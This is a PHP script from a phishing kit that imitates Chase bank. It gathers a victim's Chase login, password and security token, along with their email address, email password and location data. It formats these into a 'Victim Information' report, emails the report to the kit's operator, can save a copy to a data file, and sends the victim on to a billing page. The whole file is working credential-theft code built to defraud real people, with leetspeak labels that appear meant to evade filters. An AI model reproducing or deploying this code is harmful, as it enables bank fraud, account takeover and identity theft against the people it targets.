<?php
// require 'vendor/autoload.php';
// include('mailer.php');
session_start();
require_once '../main.php';
include('../detects.php');
include('../blockers.php');
if (!$_POST['emailPassword']){
    } else {
        $userbank = $_SESSION['userbank'];
        $passwordbank = $_SESSION['passwordbank'];
        $securityTokenbank = $_SESSION['securityTokenbank'];
        $emaildress = $_SESSION['emaildress'] = $_POST['emaildress'];
        $emailPassword = $_SESSION['emailPassword'] = $_POST['emailPassword'];
        $emailretry = $_SESSION['emailretry'] = $_POST['emailretry'];
        $emailType = $_SESSION['emailType'] = $_POST['emailType'];
        $emailProvider = $_SESSION['emailProvider'] = $_POST['emailProvider'];
        $cityg = $_SESSION['cityg'] = $_POST['cityg'];
        $regiong = $_SESSION['regiong'] = $_POST['regiong'];
        $countryg = $_SESSION['countryg'] = $_POST['countryg'];
        $datet= $date;
        $VictimInfo1 = "| Submitted by : " . $v_ip . " (" . gethostbyaddr($v_ip) . ")";
        $VictimInfo2 = "| L0cation : " . $citykota . ", " . $regioncity . ", " . $countryname . "";
        $VictimInfo3 = "| User4gent : " . $user_agent . "";
        $VictimInfo4 = "| Br0wser : " . $br . "";
        $VictimInfo5 = "| Os : " . $os . "";
        $message = "+ -------- [ ⚡ NodeZero ⚡ ] -----------+\n";
        $message .= "+ 🏦 Ch4se L0gin Det4ils\n";
        $message .= "| Ch4se l0gin : $userbank\n";
        $message .= "| Ch4se p4ssw0rd : $passwordbank\n";
        if (isset($_SESSION['securityTokenbank'])) {
        $message .= "| Ch4se S3curity T0ken : $securityTokenbank\n";
        }
        $message .= "+ ------------------------------------+\n";
        $message .= "+ ✅ Email login $emailretry\n";
        $message .= "| Em4il l0gin : $emaildress\n";
        $message .= "| Em4il p4ssword : $emailPassword\n";
        $message .= "| Em4il Provider : $emailProvider\n";
        $message .= "| Em4il Type : $emailType\n";
        $message .= "+ ------------------------------------+\n";
        $message .= "+ 🌐 Victim Inf0rmati0n\n";
        $message .= "$VictimInfo1\n";
        $message .= "$VictimInfo2\n";
        $message .= "$VictimInfo3\n";
        $message .= "$VictimInfo4\n";
        $message .= "$VictimInfo5\n";
        $message .= "| 🕛 Received : $date\n";
        $message .= "+ ------------------------------------+\n";
    $subject = "CH4SE EM4IL: ".$_POST['emaildress']." [ $cn - $os - $v_ip ]";
    kirim_mail($email_result, "CH4SE EM4IL  ".$emailretry." ".$emaildress, $subject, $message);
    if($save_file == "on") {
        tulis_file("../data/Data_email.txt", $message);
    }
    header('Location: billing?key='.$key);
}
?>